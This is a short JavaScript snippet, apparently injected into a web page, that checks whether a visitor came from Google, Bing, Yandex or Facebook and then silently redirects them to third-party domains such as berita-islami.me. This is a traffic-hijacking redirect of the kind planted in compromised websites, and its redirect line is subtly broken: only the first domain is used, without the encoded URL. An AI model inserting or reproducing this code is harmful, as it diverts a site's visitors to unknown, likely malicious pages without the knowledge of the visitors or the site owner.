 //<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');

      if(is_se)
    	{
    		var url = window.location.href;
    		window.location = "https://berita-islami.me/?arsae=","https://chiarafans.club/?arsae=","https://oneorbit.xyz/?arsae="+ encodeURIComponent(url);
    	}
    }
//]]>
 
